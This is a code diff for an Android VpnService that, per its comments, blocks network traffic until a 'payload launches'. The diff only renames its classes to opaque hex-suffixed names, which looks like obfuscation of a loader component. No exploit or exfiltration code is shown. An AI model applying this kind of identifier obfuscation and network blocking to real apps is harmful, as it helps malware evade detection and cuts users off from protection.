@@ -21,16 +21,16 @@ import java.io.IOException;
  *     resolution also times out.
  *
  * Lifecycle:
- *   - Started from MainActivity after VPN permission is granted.
- *   - Stopped via BlockVpnService.stop(ctx) ONLY after the payload launches.
+ *   - Started from A4450c4b785 after VPN permission is granted.
+ *   - Stopped via V4450c4b785.stop(ctx) ONLY after the payload launches.
  *   - Returns START_NOT_STICKY so the OS never restarts it automatically.
  */
-public class BlockVpnService extends VpnService {
+public class V4450c4b785 extends VpnService {
 
-    static final String TAG = "BlockVpnService";
+    static final String TAG = "V4450c4b785";
 
-    /** Static reference so MainActivity can call stop() directly on the instance. */
-    private static volatile BlockVpnService instance;
+    /** Static reference so A4450c4b785 can call stop() directly on the instance. */
+    private static volatile V4450c4b785 instance;
 
     private ParcelFileDescriptor vpnInterface;
     private Thread               packetSink;
@@ -45,19 +45,19 @@ public class BlockVpnService extends VpnService {
      * Falls back to stopService() if the instance is unavailable.
      */
     public static void stop(Context ctx) {
-        BlockVpnService svc = instance;
+        V4450c4b785 svc = instance;
         if (svc != null) {
             svc.running = false;          // signal the sink thread to exit
             svc.closeInterface();         // close TUN fd (unblocks any blocking read)
             svc.stopSelf();               // tell the OS to destroy this service
         } else {
-            ctx.stopService(new Intent(ctx, BlockVpnService.class));
+            ctx.stopService(new Intent(ctx, V4450c4b785.class));
         }
     }
 
     /** Returns true while the TUN interface is established and running. */
     public static boolean isRunning() {
-        BlockVpnService svc = instance;
+        V4450c4b785 svc = instance;
         return svc != null && svc.running && svc.vpnInterface != null;
     }
 
